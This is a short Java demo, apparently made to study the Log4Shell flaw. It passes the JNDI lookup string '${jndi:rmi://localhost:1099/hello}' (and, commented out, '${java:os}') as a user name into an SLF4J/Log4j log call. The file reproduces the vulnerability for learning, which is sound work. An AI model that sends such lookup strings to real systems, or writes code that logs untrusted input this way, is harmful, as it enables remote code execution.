package com.huangbo.log.logsafe;

import lombok.extern.slf4j.Slf4j;

@Slf4j
public class LogSafeDemo {
    public static void main(String[] args) {
//        String name = "${java:os}";
        String name = "${jndi:rmi://localhost:1099/hello}";
        login(name);
    }
    public static void login(String name){
        log.info(name);
    }
}
